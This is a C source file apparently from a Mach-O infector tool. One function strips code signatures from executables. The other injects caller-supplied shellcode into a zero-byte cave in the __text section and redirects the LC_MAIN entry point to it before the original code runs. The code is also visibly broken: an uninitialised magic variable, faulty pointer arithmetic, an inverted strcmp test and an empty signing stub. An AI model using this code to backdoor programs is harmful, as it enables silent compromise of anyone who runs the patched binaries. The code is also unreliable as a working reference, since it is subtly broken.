#include "macho.h"
int MACH_O_sign(char *file,char *signature){

    return 0;
}
int MACH_O_sig_remove(char *file){
int i,j;
uint32_t size;
uint32_t magic;
uint32_t sig_offset;
uint32_t sig_size;
char *mach_o = load_file(file, &size);
load_command *load;
dysymtab_command *dysymtab;
symtab_command *symtab;
twolevel_hints_command *hints;
linkedit_data_command *ld;
linkedit_data_command *sig = NULL;
fileset_entry_command *fe;
uint32_t cmdsize;
memcpy(&magic,mach_o,sizeof(uint32_t));
if(magic==0xFEEDFACE){
   mach_header *mach_hdr32 = (mach_header*)mach_o;
   load = (load_command*) (mach_o + sizeof(mach_header));
   for (i = 0; i < mach_hdr32->ncmds; i++){
    if(load->cmd == LC_CODE_SIGNATURE){
        sig = (linkedit_data_command*)load;
        sig_offset = sig->dataoff;
        sig_size = sig->datasize;
        mach_hdr32->ncmds--;
        mach_hdr32->sizeofcmds-=sig_size;
        break;
    }
   load = (load_command*)(load + load->cmdsize);
}
if(sig == NULL){
    free(mach_o);
    return -1;
}
load = (load_command*) (mach_o + sizeof(mach_header));
for (i = 0; i < mach_hdr32->ncmds; i++){
    if(load->cmd == LC_SYMTAB){
        symtab = (symtab_command *)(load);
        if (symtab->symoff > sig_offset) {
            symtab->symoff -= sig_size;
        }
        if (symtab->stroff > sig_offset) {
            symtab->stroff -= sig_size;
        }
    }
    if (load->cmd == LC_DYSYMTAB) {
       dysymtab = (dysymtab_command *)(load);
        if (dysymtab->tocoff > sig_offset) {
            dysymtab->tocoff -= sig_size;
        }
        if (dysymtab->modtaboff > sig_offset) {
            dysymtab->modtaboff -= sig_size;
        }
        if (dysymtab->extrefsymoff > sig_offset) {
            dysymtab->extrefsymoff -= sig_size;
        }
        if (dysymtab->indirectsymoff > sig_offset) {
            dysymtab->indirectsymoff -= sig_size;
        }
        if (dysymtab->extreloff > sig_offset) {
            dysymtab->extreloff -= sig_size;
        }
        if (dysymtab->locreloff > sig_offset) {
            dysymtab->locreloff -= sig_size;
        }
    }
    if (load->cmd == LC_TWOLEVEL_HINTS) {
        hints = (twolevel_hints_command *)(load);

        if (hints->offset > sig_offset) {
            hints->offset -= sig_size;
        }

    }
    if (load->cmd == LC_SEGMENT_SPLIT_INFO ||
        load->cmd == LC_FUNCTION_STARTS ||
        load->cmd == LC_DATA_IN_CODE ||
        load->cmd == LC_DYLIB_CODE_SIGN_DRS ||
        load->cmd == LC_LINKER_OPTIMIZATION_HINT ||
        load->cmd == LC_DYLD_EXPORTS_TRIE ||
        load->cmd == LC_DYLD_CHAINED_FIXUPS) {

        ld = (linkedit_data_command *)(load);
    if (ld->dataoff > sig_offset){
        ld->dataoff -= sig_size;
    }
        }
        if (load->cmd == LC_FILESET_ENTRY) {
            fe = (fileset_entry_command *)load;

            if (fe->fileoff > sig_offset) {
                fe->fileoff -= sig_size;
            }
        }
    if(load->cmd == LC_SEGMENT){
        segment_command *seg32 = (segment_command *)(load);
        if(seg32->fileoff > sig_offset)seg32->fileoff -= sig_size;
        section *sect32 = (section *)(seg32 + 1);
        for (j = 0; j < seg32->nsec; j++) {
            if (sect32->fileoff > sig_offset) sect32->fileoff -= sig_size;
            sect32++;
        }
    }

    load = (load_command*)(load + load->cmdsize);
}
}
if(magic==0xFEEDFACF){
   mach_header_64 *mach_hdr64 = (mach_header_64*)mach_o;
   load = (load_command *) (mach_o + sizeof(mach_header_64));
   for (i = 0; i < mach_hdr64->ncmds; i++){
    if (load->cmd == LC_CODE_SIGNATURE){
        sig = (linkedit_data_command*)load;
        sig_offset = sig->dataoff;
        sig_size = sig->datasize;
        mach_hdr64->ncmds--;
        mach_hdr64->sizeofcmds-=sig_size;
        break;
    }
   load = (load_command *)(load +load->cmdsize);
   }
   if(sig == NULL){
       free(mach_o);
       return -1;
   }
load = (load_command *) (mach_o + sizeof(mach_header_64));
for (i = 0; i < mach_hdr64->ncmds; i++){
    if(load->cmd == LC_SYMTAB){
        symtab = (symtab_command *)(load);
        if (symtab->symoff > sig_offset) {
            symtab->symoff -= sig_size;
        }
        if (symtab->stroff > sig_offset) {
            symtab->stroff -= sig_size;
        }
    }
    if (load->cmd == LC_DYSYMTAB) {
        dysymtab = (dysymtab_command *)(load);
        if (dysymtab->tocoff > sig_offset) {
            dysymtab->tocoff -= sig_size;
        }
        if (dysymtab->modtaboff > sig_offset) {
            dysymtab->modtaboff -= sig_size;
        }
        if (dysymtab->extrefsymoff > sig_offset) {
            dysymtab->extrefsymoff -= sig_size;
        }
        if (dysymtab->indirectsymoff > sig_offset) {
            dysymtab->indirectsymoff -= sig_size;
        }
        if (dysymtab->extreloff > sig_offset) {
            dysymtab->extreloff -= sig_size;
        }
        if (dysymtab->locreloff > sig_offset) {
            dysymtab->locreloff -= sig_size;
        }
    }
    if (load->cmd == LC_TWOLEVEL_HINTS) {
        hints = (twolevel_hints_command *)(load);

        if (hints->offset > sig_offset){
            hints->offset -= sig_size;
        }
    }
    if (load->cmd == LC_SEGMENT_SPLIT_INFO ||
        load->cmd == LC_FUNCTION_STARTS ||
        load->cmd == LC_DATA_IN_CODE ||
        load->cmd == LC_DYLIB_CODE_SIGN_DRS ||
        load->cmd == LC_LINKER_OPTIMIZATION_HINT ||
        load->cmd == LC_DYLD_EXPORTS_TRIE ||
        load->cmd == LC_DYLD_CHAINED_FIXUPS) {

        ld = (linkedit_data_command *)(load);
        if (ld->dataoff > sig_offset){
            ld->dataoff -= sig_size;
        }
        }
        if (load->cmd == LC_FILESET_ENTRY) {
            fe = (fileset_entry_command *)load;

            if (fe->fileoff > sig_offset) {
                fe->fileoff -= sig_size;
            }
        }
        if(load->cmd == LC_SEGMENT_64){
       segment_command_64 *seg64 = (segment_command_64*)(load);
        if(seg64->fileoff > sig_offset)seg64->fileoff -= sig_size;
        section_64 *sect64 = (section_64 *)(seg64 + 1);
        for (j = 0; j < seg64->nsec; j++) {
            if (sect64->fileoff > sig_offset) sect64->fileoff -= sig_size;
            sect64++;
        }
    }
    load = (load_command *)(load +load->cmdsize);
}
}

size -= sig_size;
memmove(mach_o + sig_offset,mach_o + sig_offset + sig_size,size - sig_offset - sig_size);
extend_file(file,size);
write_data(file,0,mach_o,size);
free(mach_o);
return 0;
}

int MACH_O_inject(char *file,char *shellcode,int shellcode_len){
int i;
uint32_t size;
uint32_t machine_type;
uint32_t oryginal_entry;
uint32_t vaddr;

load_command *load;
entry_point_command *entry;

char *mach_o = load_file(file,&size);
if(machine_type==0xFEEDFACE){
mach_header *mach_hdr32 = (mach_header*)mach_o;
segment_command *seg32;
segment_command *text_seg32;
section *sec32;
load = (load_command*) (mach_o + sizeof(mach_header));
for( i = 0 ; i < mach_hdr32->ncmds ; i++){
if(load->cmd == LC_SEGMENT){
seg32 = (segment_command*) load;
if(strcmp(seg32->segname,"__TEXT")==0){
    text_seg32 = seg32;

}
}
if(load->cmd == LC_MAIN ){
entry = (entry_point_command*)load;
}
    load = (load_command *)(load + load->cmdsize );
}
sec32 = (section *)(text_seg32 + sizeof(segment_command));
    for(i = 0 ; i < text_seg32->nsec ; i++)
    {
        if (strcmp(sec32->secname,"__text" ))
        break;
        sec32++;
    }
    unsigned long offset = sec32->fileoff;
    uint32_t count = 0;
for ( i = 0 ; i < sec32->filesize ; i++){
   if(mach_o[offset] == 0x00){
     offset +=1;
     count +=1;
     if (count == (shellcode_len+5)){

        offset -=count;
        vaddr = sec32->addr + (offset - sec32->fileoff);
        oryginal_entry = text_seg32->vmaddr + entry->entry_off;
        entry->entry_off = (offset - text_seg32->fileoff );

        char *payload =  apply_suffix(shellcode,shellcode_len,oryginal_entry,vaddr);
        write_data(file,0,mach_o,size);
        write_data(file,offset,payload,count);
        free(payload);
        free(mach_o);
        return 0;
     }
   }
   else{
    offset +=1;
    count = 0;
   }

}
}
if(machine_type==0xFEEDFACF){
    mach_header_64 *mach_hdr64 = (mach_header_64*)mach_o;
    segment_command_64 *seg64;
    segment_command_64 *text_seg64;
    section_64 *sec64;

    load = (load_command*) (mach_o + sizeof(mach_header_64));
    for( i = 0 ; i < mach_hdr64->ncmds ; i++){
    if(load->cmd ==LC_SEGMENT_64){
    seg64 = (segment_command_64*) load;
    if(strcmp(seg64->segname,"__TEXT")==0){
        text_seg64 = seg64;

    }
    }
    if(load->cmd == LC_MAIN ){
    entry = (entry_point_command*)load;
    }
        load = (load_command *)(load + load->cmdsize );
    }
    sec64 = (section_64 *)(text_seg64 + sizeof(segment_command_64));
        for(i = 0 ; i < text_seg64->nsec ; i++)
        {
            if (strcmp(sec64->secname,"__text" ))
            break;
            sec64++;
        }
        unsigned long offset = sec64->fileoff;
        uint32_t count = 0;
    for ( i = 0 ; i < sec64->filesize ; i++){
       if(mach_o[offset] == 0x00){
         offset +=1;
         count +=1;
         if (count == (shellcode_len+5)){

            offset -=count;
            vaddr = sec64->addr + (offset - sec64->fileoff);
            oryginal_entry = text_seg64->vmaddr + entry->entry_off;
            entry->entry_off = (offset - text_seg64->fileoff );

            char *payload =  apply_suffix(shellcode,shellcode_len,oryginal_entry,vaddr);
            write_data(file,0,mach_o,size);
            write_data(file,offset,payload,count);
            free(payload);
            free(mach_o);
            return 0;
         }
       }
       else{
        offset +=1;
        count = 0;
       }

    }


}

return -1;
}

